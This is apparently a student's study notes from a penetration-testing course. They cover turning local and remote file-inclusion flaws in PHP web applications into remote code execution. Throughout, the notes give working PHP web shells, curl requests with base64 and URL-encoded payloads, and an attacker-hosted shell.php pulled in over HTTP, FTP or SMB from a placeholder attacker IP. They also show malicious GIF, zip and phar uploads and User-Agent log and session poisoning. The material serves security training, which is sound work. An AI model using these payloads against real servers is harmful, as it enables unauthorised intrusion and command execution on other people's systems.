# 1. PHP Wrappers for Remote Code Execution

While file inclusion vulnerabilities can be used to disclose local files, they can also lead to remote code execution on backend servers.

Approaches to gain control:
- Enumerate credentials and SSH keys to login remotely
- Look for database passwords in files like `config.php` (often reused as user passwords)  
- Check for improperly secured SSH keys in user `.ssh` directories

Beyond enumeration methods, PHP Wrappers can enable direct remote code execution through the vulnerable function itself. The following sections will explore these PHP-specific techniques as well as language-agnostic methods.

## 1.1 - Data Wrapper

The PHP `data` wrapper can execute PHP code, but requires `allow_url_include` to be enabled in PHP configurations.

### Checking PHP Configuration

First, verify if `allow_url_include` is enabled by reading the PHP configuration file. To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. Check **Apache or Nginx** by `curl -I`, or `nmap`, or `whatweb`, ... Then, we can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

```shell-session
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then decode and check the setting:
```shell-session
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
allow_url_include = On
```

**Important:** This setting is disabled by default but sometimes enabled for certain applications like WordPress plugins.

### Remote Code Execution

With `allow_url_include` enabled, create a base64-encoded PHP web shell:
```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

`http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

We may also use cURL for the same attack, as follows:

```
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 1.2 - Input Wrapper

The `input` wrapper executes PHP code from POST request data, requiring:
- `allow_url_include` to be enabled
- The vulnerable parameter must accept POST requests

To use it, send a POST request with a PHP web shell as the body and pass commands via GET parameters:
```shell-session
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** If the function only accepts POST requests, embed commands directly in your PHP code: `<?php system('id')?>`

## 1.3 - Expect Wrapper

The `expect` wrapper allows direct command execution via URL streams, similar to a web shell but without needing to upload one. It's an external PHP module that must be manually installed and enabled on the server.

We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:

```
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This wrapper simplifies RCE and also works in XXE attacks if supported.

# 2. Remote File Inclusion (RFI)

If the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

## 2.1 - Local vs. Remote File Inclusion

Vulnerable functions that allow remote file inclusion (RFI) can let attackers host malicious scripts and include them in a page to achieve remote code execution. The following are some of the functions that (if vulnerable) would allow RFI:


| Function                      | Read Content | Execute | Remote URL |
|------------------------------|--------------|---------|------------|
| **PHP**                      |              |         |            |
| `include()/include_once()`   | ✅           | ✅      | ✅         |
| `file_get_contents()`        | ✅           | ❌      | ✅         |
| **Java**                     |              |         |            |
| `import`                     | ✅           | ✅      | ✅         |
| **.NET**                     |              |         |            |
| `@Html.RemotePartial()`      | ✅           | ❌      | ✅         |
| `include`                    | ✅           | ✅      | ✅         |

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
- The vulnerable function may not allow including remote URLs
- You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://, ftp://, https://`).
- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

## 2.2 - Verify RFI

**Testing for Remote File Inclusion:**

1. **Check server configuration:**
   - In PHP, verify if `allow_url_include = On` in PHP configuration
   - This can be checked via LFI but isn't always reliable

2. **Practical verification approach:**
   - Attempt to include a URL to confirm RFI vulnerability
   - Start with local URL inclusion as a safer test:
     ```
     http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
     ```
   - Local URL testing helps avoid potential firewall blocks

3. **Important note:** Remote inclusion is typically disabled by default in modern frameworks as it's considered dangerous

4. **Results of the test:**
- Successfully included `index.php` from local URL in the History Description section
- The included PHP was executed, not displayed as source code
- This confirms vulnerability to both URL inclusion and code execution

5. **Security implications:**
- We can include and execute malicious PHP scripts hosted on our machine
- SSRF capabilities confirmed (able to specify port 80)
- Can potentially access internal web applications on other ports (e.g., 8080)

6. **Warning:** Avoid including the vulnerable page itself (like `index.php`) as this may trigger a recursive inclusion loop, potentially causing denial of service.

## 2.3 - Remote Code Execution with RFI

**Creating a malicious script:**
```shell-session
inferLeo@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Key considerations for hosting the malicious script:**
- Host on common HTTP ports (80 or 443) to bypass potential firewall restrictions
- These standard ports are often whitelisted for outgoing connections
- Alternative hosting options include FTP or SMB services

**Next steps:**
1. Host the malicious script on your machine
2. Include it through the RFI vulnerability
3. Control the remote system through the "cmd" parameter

### HTTP

**Setting up the web server:**
```shell-session
$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

**Executing the attack:**
1. Include your hosted shell with command parameter:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
   ```

2. Connection confirmation:
   ```
   SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
   ```

**Tip:** Monitor incoming requests on your server to troubleshoot issues - if you notice modifications (like appended extensions), adjust your payload accordingly.


### FTP

**Setting up the FTP server:**
```shell-session
$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

**Executing the attack:**
1. Include script via FTP protocol:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
   ```

2. For servers requiring authentication:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
   ```

**Advantages of FTP method:**
- Bypasses HTTP port restrictions
- Avoids WAF filters blocking `http://` strings
- PHP attempts anonymous authentication by default

### SMB

If the vulnerable web application is `hosted on a Windows server` (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

**Setting up the SMB server:**
```shell-session
$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

**Executing the attack:**
```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

**Key advantages for Windows targets:**
- Doesn't require `allow_url_include` setting to be enabled
- Windows treats remote SMB files as normal local files
- Uses UNC paths for file inclusion

**Important limitation:**
Most effective when on the same network as the target, as remote SMB access over the internet is often restricted by default Windows configurations.

# 3. LFI and File Uploads

File uploads are common in web apps, allowing users to store data. For attackers, uploading files can enhance exploits like Local File Inclusion (LFI). This doesn’t require a vulnerable upload form—just the ability to upload a file. If the LFI function can execute code, any code inside the uploaded file (even with an image extension like `.jpg`) can be executed when included, leading to remote code execution.

 The following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

| **Function**                        | **Read Content** | **Execute** | **Remote URL** |
|------------------------------------|------------------|-------------|----------------|
| **PHP**                            |                  |             |                |
| `include()` / `include_once()`     | ✅               | ✅          | ✅             |
| `require()` / `require_once()`     | ✅               | ✅          | ❌             |
| **NodeJS**                         |                  |             |                |
| `res.render()`                     | ✅               | ✅          | ❌             |
| **Java**                           |                  |             |                |
| `import`                           | ✅               | ✅          | ✅             |
| **.NET**                           |                  |             |                |
| `include`                          | ✅               | ✅          | ✅             |

## 3.1 - Image upload

1. **Crafting a Malicious Image**

We start by creating an image file that appears valid but contains a PHP web shell. To bypass basic upload filters, we use a permitted image extension (e.g., `.gif`) and include valid image magic bytes (e.g., `GIF8`) at the beginning:

```bash
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file is harmless on its own but can lead to remote code execution if used with an LFI vulnerability.

*Note: We use GIF since its magic bytes are ASCII, making them easier to embed. This method works with any allowed file type if formatted correctly.*

2. **Uploading the Malicious Image**

Upload your image to the site accepted path. In some case, it could be a profile page where you can upload your avater image.

3. **Finding the Uploaded File Path**

After uploading, we need the file path to include it via LFI. Typically, image uploads are accessible via a public URL. In our case, inspecting the page source reveals:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

So, the path to use is `/profile_images/shell.gif`.

*Note: If the upload path isn’t visible, you may need to fuzz for the upload directory and file name—but this isn't always reliable, as some applications hide uploads securely.*

4. **Exploiting the LFI to Execute the Payload**

**Exploiting the LFI to Execute the Payload**

With the file uploaded, we can now exploit the LFI by including the image path in the vulnerable parameter. This triggers execution of our PHP code:

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

This runs the `id` command through our web shell.

*Note: We used `./profile_images/` since no directory is prefixed by the LFI function. If a directory were added before our input, we’d use `../` to navigate out before specifying the file path.*

## 3.2 - Zip Upload

1. **Make zip file**

While the image-based LFI method is reliable, in PHP environments we can also use wrappers like `zip://` to execute code—useful when other methods fail.

To try this, create a PHP web shell and compress it into a zip archive named `shell.jpg`:

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

*Note: Although the file is named `.jpg`, upload filters may detect it as a zip by checking its content type. This method is more likely to succeed if zip uploads are permitted.*

2. **Executing PHP from a Zip Archive**

After uploading `shell.jpg`, we can use the `zip://` wrapper to include and execute the PHP file inside it. The format is:

```
zip://<path-to-zip>%23<file-inside-zip>
```

In our case:

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

This runs the `id` command using the PHP web shell inside the zip archive.

*Note: We used `./profile_images/` since `index.php` is in the root directory and needs a relative path to the uploaded file.*

## 3.3 Phar Upload

We can also leverage the `phar://` wrapper to execute PHP code. First, create a Phar archive containing a web shell using this script:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Then generate the archive and rename it:

```bash
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

After uploading `shell.jpg`, execute the payload using:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

This runs the `id` command via the embedded shell.

*Note: `phar.readonly` must be disabled during creation, and the `%2F` is the URL-encoded forward slash to access `shell.txt` inside the Phar.*

As shown, the `id` command was successfully executed using the `phar://` wrapper. While both `zip://` and `phar://` are effective alternatives, the image upload + LFI method remains the most reliable.

*Note: There’s also a legacy LFI/uploads technique involving exposed `phpinfo()` pages and enabled file uploads in outdated PHP versions. However, this is rare and requires very specific conditions (LFI + uploads enabled + old PHP + `phpinfo()` exposure).*


# 4. Log poisoning

This attack involves injecting PHP code into a controllable input field that gets recorded in a log file. If the application later includes that log file using a vulnerable function with `execution privileges`, the code will run. For this to work, the application must have `read` access to the log files, which depends on the server configuration.

The following functions with `Execute privileges` should be vulnerable to these attacks:

| Function                      | Read Content | Execute | Remote URL |
|------------------------------|--------------|---------|------------|
| **PHP**                      |              |         |            |
| include()/include_once()     | ✅           | ✅      | ✅         |
| require()/require_once()     | ✅           | ✅      | ❌         |
| **NodeJS**                   |              |         |            |
| res.render()                 | ✅           | ✅      | ❌         |
| **Java**                     |              |         |            |
| import                       | ✅           | ✅      | ✅         |
| **.NET**                     |              |         |            |
| include                      | ✅           | ✅      | ✅         |


## 4.1 - PHP Session Poisoning

PHP applications use PHPSESSID cookies to track user data, which is stored in session files on the server—typically in `/var/lib/php/sessions/` (Linux) or `C:\Windows\Temp\` (Windows). These files are named with the `sess_` prefix followed by the session ID. For example, a PHPSESSID of `el4ukv0kqbvoirg7nkp4dncpk3` corresponds to `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

To begin, check if your PHPSESSID cookie is set—e.g., `nhhv8i0o6ua4g88bkdl9u1fdsd`. The corresponding session file is `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Try including it via the LFI vulnerability to inspect its contents:

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<your_session_id>`

Note: Session IDs vary, so use your own cookie value.

The session file contains two values: `page` (controlled via the `?language=` parameter) and `preference` (auto-set). Since we control `page`, we can test this by visiting:

`http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`

Then, include the session file again to confirm the change:

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<your_session_id>`

If `session_poisoning` appears, it confirms write access. Now, inject PHP code (e.g., a web shell) using a URL-encoded payload:

`http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`

Finally, we can include the session file and use the &cmd=id to execute a commands:

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

**Note:**
Each time the session file is used, it gets overwritten—replacing our web shell. To avoid this, we should use the temporary shell to upload a persistent one to the web directory or trigger a reverse shell for stable access.

## 4.2 - Server Log Poisoning

Apache and Nginx store request data in logs like `access.log`, which includes the User-Agent header—something we can control to inject PHP code. To exploit this via LFI, the logs must be readable. Nginx logs usually are (e.g., by `www-data`), while Apache logs typically require higher privileges unless misconfigured.

Default log paths:

* **Apache:** `/var/log/apache2/` (Linux), `C:\xampp\apache\logs\` (Windows)
* **Nginx:** `/var/log/nginx/` (Linux), `C:\nginx\log\` (Windows)

If paths vary, we can use LFI fuzzing to find them.

So, for example, we found the correct Apache access log from /var/log/apache2/access.log with: `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`

From here, we can read the log. The log contains the `remote IP address, request page, response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

**Note**: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

We will use Burp Suite to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`: 

`User-Agent: Apache Log Poisoning`

**Note:** As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.

 When we see our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell: 

`User-Agent: <?php system(\$_GET['cmd']); ?>`

We may also poison the log by sending a request through cURL, as follows:

```
$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`):

`GET /index.php?language=/var/log/apache2/access.log&cmd=id HTTP/1.1`

We'll see that we successfully executed the command. The exact same attack can be carried out on Nginx logs as well.

**Note:** The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Other logs may be poisonable if readable through LFI, such as:

* `/var/log/sshd.log`
* `/var/log/mail`
* `/var/log/vsftpd.log`

If services like `SSH`, `FTP`, or `mail` are accessible, we can inject PHP code into controllable fields (e.g. username or email body), and trigger code execution by including the corresponding log via LFI. This applies to any readable log capturing user-controlled input.
